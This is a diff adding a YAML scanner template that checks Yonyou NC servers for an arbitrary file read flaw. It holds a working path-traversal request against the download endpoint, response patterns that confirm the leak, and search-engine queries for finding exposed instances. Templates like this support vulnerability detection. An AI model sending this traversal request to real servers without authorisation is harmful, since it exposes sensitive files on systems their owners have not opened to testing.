@@ -1,0 +1,26 @@
+id: yonyou-nc-download-fileread
+
+info:
+  name: 用友NC download文件存在任意文件读取漏洞
+  author: Y3y1ng
+  severity: high
+  verified: true
+  description: |-
+    用友NC的download文件存在任意文件读取漏洞，攻击者可以利用该漏洞读取服务器上的敏感文件。
+    Fofa: app="用友-UFIDA-NC"
+    Hunter: web.title="YONYOU NC"
+    ZoomEye: app:"Yonyou NC httpd"
+  reference:
+    - https://mp.weixin.qq.com/s/oVRiOXEG9cxEtyE8q0UKZQ
+  tags: yonyou,fileread
+  created: 2023/12/04
+rules:
+  r0:
+    request:
+      method: GET
+      path: /portal/pt/xml/file/download?pageId=login&filename=..%5Cindex.jsp
+    expression: |
+      response.status == 200 &&
+      response.body.bcontains(b"response.addHeader") &&
+      response.body.bcontains(b"request.getSession")
+expression: r0()
